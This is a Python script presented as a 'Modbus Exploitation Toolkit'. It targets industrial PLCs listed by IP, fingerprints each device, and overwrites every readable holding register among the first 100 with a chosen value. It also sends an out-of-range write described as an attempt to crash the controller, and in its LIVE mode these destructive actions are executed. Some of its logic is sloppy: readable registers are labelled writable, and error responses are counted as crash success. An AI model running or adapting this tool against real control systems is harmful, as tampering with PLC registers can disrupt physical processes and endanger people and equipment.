#!/usr/bin/env python3
import argparse
from pymodbus.client import ModbusTcpClient
import time
import sys
from colorama import Fore, Style, init
from pyfiglet import Figlet

# Initialize colorama
init()

# ANSI Colors for styling
GREEN  = Fore.GREEN
YELLOW = Fore.YELLOW
RED    = Fore.RED
CYAN   = Fore.CYAN
WHITE  = Fore.WHITE
RESET  = Style.RESET_ALL

# Global variable for output file (if provided)
OUTPUT_FILE = None

def log_out(message):
    """Prints the message and writes it to the output file if set."""
    print(message)
    if OUTPUT_FILE:
        try:
            with open(OUTPUT_FILE, "a") as f:
                f.write(message + "\n")
        except Exception as e:
            print(f"{RED}[-] Error writing to output file: {e}{RESET}")

def print_banner():
    """Displays a fancy ASCII banner using pyfiglet."""
    f = Figlet(font="slant")
    banner_text = f.renderText("Modbus Exploit")
    
    print(f"{CYAN}{banner_text}{RESET}")
    print("=" * 80)
    print(f"{CYAN}  Modbus Exploitation Toolkit - Red Team Edition {RESET}")
    print(f"{CYAN}  Made by #AfterDark {RESET}")
    print("=" * 80)
    print(f"{YELLOW}[!] DISCLAIMER: This tool is for authorized testing only. {RESET}")
    print(f"{YELLOW}    The author assumes no liability for misuse. {RESET}")
    print("=" * 80)

def print_mode(test_mode):
    """Displays the selected mode in a decorated box."""
    border = "*" * 80
    mode_text = ("[!] MODE Selected: TEST - Destructive actions will be simulated" 
                 if test_mode else 
                 "[!] MODE Selected: LIVE - Destructive actions will be executed")
    print(f"{CYAN}{border}{RESET}")
    print(f"{CYAN}{mode_text.center(80)}{RESET}")
    print(f"{CYAN}{border}{RESET}\n")

def detect_plc_info(ip):
    """ 
    Detect PLC Model, Firmware Version, and Additional Information.
    Returns True if valid information was retrieved; otherwise, returns False.
    """
    client = ModbusTcpClient(ip, port=502)
    if not client.connect():
        log_out(f"{RED}[-] Failed to connect to {ip}:502{RESET}")
        return False

    log_out(f"{CYAN}[+] Detecting PLC model, firmware version, and hardware details on {ip}...{RESET}")

    try:
        # Using Modbus Function Code 43 (Read Device Identification)
        response = client.read_device_information()
    except Exception as e:
        log_out(f"{RED}[-] Error reading device information: {e}{RESET}")
        client.close()
        return False

    if response is None or response.isError():
        log_out(f"{RED}[-] Unable to retrieve PLC information. The device may not support identification or did not respond.{RESET}")
        client.close()
        return False
    else:
        try:
            manufacturer     = response.information.get(0, b"Unknown").decode("utf-8")
            model            = response.information.get(1, b"Unknown").decode("utf-8")
            firmware_version = response.information.get(2, b"Unknown").decode("utf-8")
            serial_number    = response.information.get(3, b"Unknown").decode("utf-8")
            hardware_version = response.information.get(4, b"Unknown").decode("utf-8")
            log_out(f"{GREEN}[✔] Manufacturer: {WHITE}{manufacturer}{RESET}")
            log_out(f"{GREEN}[✔] Model: {WHITE}{model}{RESET}")
            log_out(f"{GREEN}[✔] Firmware Version: {WHITE}{firmware_version}{RESET}")
            log_out(f"{GREEN}[✔] Serial Number: {WHITE}{serial_number}{RESET}")
            log_out(f"{GREEN}[✔] Hardware Version: {WHITE}{hardware_version}{RESET}")
        except Exception as e:
            log_out(f"{RED}[-] Error decoding device information: {e}{RESET}")
            client.close()
            return False

    client.close()
    return True

def scan_writable_registers(ip):
    """
    Scan for all writable registers in the Modbus PLC.
    Returns a list of tuples: (register_number, current_value).
    """
    client = ModbusTcpClient(ip, port=502)
    if not client.connect():
        log_out(f"{RED}[-] Failed to connect to {ip}:502{RESET}")
        return []
    writable_registers = []
    log_out(f"{CYAN}[+] Scanning for writable registers on {ip}...{RESET}")
    for reg in range(0, 100):  # Scanning first 100 registers
        try:
            response = client.read_holding_registers(address=reg, count=1)
            if not response.isError():
                current_value = response.registers[0]
                log_out(f"{GREEN}[✔] Register {WHITE}{reg}{GREEN} is writable. Current Value: {WHITE}{current_value}{RESET}")
                writable_registers.append((reg, current_value))
            else:
                log_out(f"{YELLOW}[!] Register {WHITE}{reg}{YELLOW} did not respond (error).{RESET}")
        except Exception as e:
            log_out(f"{YELLOW}[!] Error reading register {reg}: {e}{RESET}")
            continue
    client.close()
    return writable_registers

def modify_plc_values(ip, registers, message):
    """ 
    Modify PLC values by writing full numeric strings.
    Only writes to a register if its current value is different from the desired value.
    Returns the count of registers successfully written.
    """
    client = ModbusTcpClient(ip, port=502)
    if not client.connect():
        log_out(f"{RED}[-] Failed to connect to {ip}:502{RESET}")
        return 0
    try:
        message_value = int(message)  # Convert string to integer
    except ValueError:
        log_out(f"{RED}[-] Invalid number format: {message}. Please use a numeric value.{RESET}")
        client.close()
        return 0
    success_count = 0
    for reg, current_value in registers:
        if current_value == message_value:
            log_out(f"{CYAN}[i] Register {WHITE}{reg}{CYAN} already has the value {WHITE}{message_value}{CYAN}; skipping write.{RESET}")
            continue
        log_out(f"{YELLOW}[+] Writing {WHITE}{message_value}{YELLOW} to Register {WHITE}{reg}...{RESET}")
        try:
            response = client.write_register(address=reg, value=message_value)
            if response.isError():
                log_out(f"{RED}[-] Failed to write to Register {reg}.{RESET}")
            else:
                log_out(f"{GREEN}[✔] Successfully wrote {WHITE}{message_value}{GREEN} to Register {WHITE}{reg}!{RESET}")
                success_count += 1
        except Exception as e:
            log_out(f"{YELLOW}[!] Error writing to register {reg}: {e}{RESET}")
    client.close()
    return success_count

def plc_crash(ip):
    """ Attempt to crash the PLC (simulation) """
    client = ModbusTcpClient(ip, port=502)
    if not client.connect():
        log_out(f"{RED}[-] Failed to connect to {ip}:502{RESET}")
        return
    log_out(f"{YELLOW}[+] Attempting to crash the PLC at {ip}...{RESET}")
    # For simulation purposes, send an out-of-bound write.
    try:
        response = client.write_register(address=9999, value=9999)
        if response.isError():
            log_out(f"{GREEN}[✔] Crash command sent successfully (simulation).{RESET}")
        else:
            log_out(f"{YELLOW}[!] Crash command did not trigger a crash (simulation).{RESET}")
    except Exception as e:
        log_out(f"{GREEN}[✔] Crash command sent (exception caught, simulation).{RESET}")
    client.close()

def main():
    print_banner()  # Display Banner

    parser = argparse.ArgumentParser(description="Modbus Exploitation Toolkit for Red Team")
    parser.add_argument("-t", "--target", help="Single target IP address of the Modbus PLC")
    parser.add_argument("-f", "--file", help="File containing multiple IP addresses to target")
    parser.add_argument("--detect", action="store_true", help="Detect PLC Model, Firmware, and Known Vulnerabilities")
    parser.add_argument("-m", "--message", help="Custom numeric message to write to all writable registers")
    parser.add_argument("--plc-crash", action="store_true", help="Attempt to crash the PLC")
    parser.add_argument("-a", "--all", action="store_true", help="Enable ALL features (detect, scan, exploit, crash)")
    parser.add_argument("-o", "--output", help="Save results to a file")
    parser.add_argument("-v", "--verbose", type=int, choices=[0,1,2], default=1, help="Set verbosity level")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay between requests (default: 0.2)")
    args = parser.parse_args()

    global OUTPUT_FILE
    OUTPUT_FILE = args.output

    # Build target set from a single target or file.
    targets = set()
    if args.target:
        targets.add(args.target.strip())
    elif args.file:
        try:
            with open(args.file, "r") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        targets.add(line)
        except Exception as e:
            log_out(f"{RED}[-] Error reading target file: {e}{RESET}")
            sys.exit(1)
    else:
        log_out(f"{RED}[-] No target specified!{RESET}")
        sys.exit(1)

    # Print number of loaded IPs
    log_out(f"{CYAN}[+] Loaded IPs: {len(targets)}{RESET}")

    # Global statistics counters.
    total_devices = 0
    vulnerable_targets = []
    failed_targets = []
    total_writable_registers = 0
    total_written_registers = 0

    # Determine which features to run.
    if args.all:
        detect_flag  = True
        crash_flag   = True
        message_flag = True
    else:
        detect_flag  = args.detect
        crash_flag   = args.plc_crash
        message_flag = True if args.message else False

    for target in targets:
        total_devices += 1

        # If detection is enabled, try to detect and classify the target.
        if detect_flag:
            success = detect_plc_info(target)
            if not success:
                failed_targets.append(target)
                log_out(f"{YELLOW}[!] Skipping target {target} due to detection failure.{RESET}")
                continue
            else:
                vulnerable_targets.append(target)
        # Otherwise, assume target is processed.
        regs = scan_writable_registers(target)
        total_writable_registers += len(regs)
        if message_flag and args.message:
            written = modify_plc_values(target, regs, args.message)
            total_written_registers += written
        if crash_flag:
            plc_crash(target)
        time.sleep(args.delay)

    # Print summary statistics.
    log_out("")
    log_out(f"{CYAN}[+] Summary:{RESET}")
    log_out(f"{GREEN}    Total Devices Processed: {total_devices}{RESET}")
    log_out(f"{GREEN}    Vulnerable Devices: {len(vulnerable_targets)}{RESET}")
    log_out(f"{YELLOW}    Failed Devices: {len(failed_targets)}{RESET}")
    log_out(f"{CYAN}    Total Writable Registers Found: {total_writable_registers}{RESET}")
    log_out(f"{GREEN}    Total Registers Written: {total_written_registers}{RESET}")

    # Print details of each target.
    if vulnerable_targets:
        log_out("")
        log_out(f"{GREEN}[✔] Vulnerable Targets:{RESET}")
        for t in vulnerable_targets:
            log_out(f"    {t}")
    if failed_targets:
        log_out("")
        log_out(f"{RED}[✖] Failed Targets:{RESET}")
        for t in failed_targets:
            log_out(f"    {t}")

if __name__ == "__main__":
    main()
